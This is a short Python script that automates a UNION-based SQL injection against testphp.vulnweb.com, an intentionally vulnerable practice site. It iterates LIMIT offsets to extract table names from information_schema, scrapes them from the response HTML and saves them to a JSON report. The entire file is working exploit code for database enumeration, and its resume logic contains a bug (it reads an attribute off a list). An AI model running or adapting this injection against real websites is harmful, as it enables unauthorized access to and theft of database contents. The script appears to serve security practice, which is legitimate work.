import requests
from bs4 import BeautifulSoup
import json
import time
import os 


url_target = "http://testphp.vulnweb.com/artists.php?artist=0 union select 1,2,table_name from information_schema.tables limit {},1"
limit_value = 86
name_file = "./report_table.txt"
data = []


if os.path.exists(name_file):
    with open(name_file,"r") as file:
        last_data = json.load(file)
        last_limit = last_data.data[-1]['id']
else:
    last_limit = 0



for limit in range(last_limit,limit_value):
    ulang = 0
    success = False
    while ulang < 3 and not success:
        url = url_target.format(limit)
        response = requests.get(url)
        
        if response.status_code != 200:
            print(f"Request Failed with status code : {response.status_code}.Retrying ....")
            ulang += 1
            time.sleep(4)
            continue
            
        soup = BeautifulSoup(response.content,'html.parser')
        table_name_div = soup.find('div',class_ = 'story')
        if table_name_div :
            table_name_content = table_name_div.get_text(strip=True)
            table_name_content = table_name_content.replace("view pictures of the artistcomment on this artist","").strip()
            data.append({
                "id" : limit,
                "value" : table_name_content 
            })
            success = True
            print(f"Finish add {limit}")
        else:
            print(f"Table name contnet not found for limit : {limit}.Retrying....")
            ulang += 1
            time.sleep(4)

if os.path.exists(name_file):
    with open(name_file,"r") as file:
        last_data = json.load(file)
        last_data.extend(data)
else:
    last_data = data

with open(name_file,"w") as file:
    json.dump(last_data,file,indent=4)
print(f"Scanning completed.Total item collected : {len(last_data)}")

